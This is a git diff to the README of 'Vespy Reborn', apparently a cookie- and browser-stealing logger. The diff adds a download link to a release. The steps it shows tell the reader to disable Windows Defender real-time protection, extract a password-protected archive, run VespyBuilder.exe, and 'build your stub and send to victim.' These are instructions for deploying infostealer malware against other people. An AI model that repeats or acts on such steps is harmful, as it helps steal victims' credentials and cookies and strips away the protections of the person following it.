@@ -7,7 +7,7 @@ Remake of Vespy Logger. Added major improvements such as browser support, cookie
 
 ## ❓How to use 
 1. Disable your windows defender or antivirus (Open windows security -> Virus and threat protection -> Turn off real time protection)
-3. Download the latest release [here]()
+3. Download the latest release [here](https://github.com/Amittere1/Vespy-Reborn/releases/tag/v1.2)
 4. Extract the file by right clicking and selecting **extract here** (Password is **2023**)
 5. Open **VespyBuilder.exe**
 6. Build your stub and send to victim
